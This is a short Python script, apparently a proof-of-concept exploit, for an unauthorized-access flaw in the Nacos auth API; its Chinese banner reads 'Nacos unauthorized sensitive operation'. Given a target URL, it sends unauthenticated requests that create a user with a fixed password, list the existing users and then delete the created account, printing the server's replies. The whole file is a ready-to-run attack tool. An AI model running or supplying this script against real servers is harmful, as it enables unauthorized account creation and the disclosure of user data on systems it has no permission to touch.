import requests
import sys


def exec(url):

    headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    }       
    re1 = requests.post(url=url + "/nacos/v1/auth/users?username=test&password=ABC@12311@",headers=headers1)
    re2 = requests.get(url=url + "/nacos/v1/auth/users/?pageNo=1&pageSize=9",headers=headers1)
    re3 = requests.delete(url=url + "/nacos/v1/auth/users?username=test",headers=headers1)
    print(re1.text)
    print(re2.text)
    print(re3.text)


if __name__ == "__main__":
  print('''Nacos未授权敏感操作
usage: python nacos.py url
''')
  if(len(sys.argv)>1):
    url = sys.argv[1]
    exec(url)
  else:
    exit()
